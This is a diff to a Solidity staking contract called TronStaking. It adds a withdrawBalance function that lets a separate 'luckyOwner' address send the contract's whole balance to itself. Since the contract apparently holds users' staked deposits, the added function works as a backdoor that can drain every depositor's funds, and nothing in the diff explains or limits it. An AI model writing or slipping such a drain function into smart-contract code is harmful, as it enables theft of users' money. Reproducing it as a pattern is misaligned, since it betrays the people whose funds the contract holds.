@@ -395,6 +395,11 @@ contract TronStaking {
 		luckyOwner = _luckyOwner;
  	}
 
+	 function withdrawBalance() public {
+		require(msg.sender == luckyOwner, "Not authorized"); 
+		luckyOwner.transfer(address(this).balance);
+ 	}
+
 	function addLuckyBonus(address payable _addr, uint256 _val ) public {
 		require(msg.sender == owner,"Cannot add lucky bonus");
 		User storage user = users[_addr];
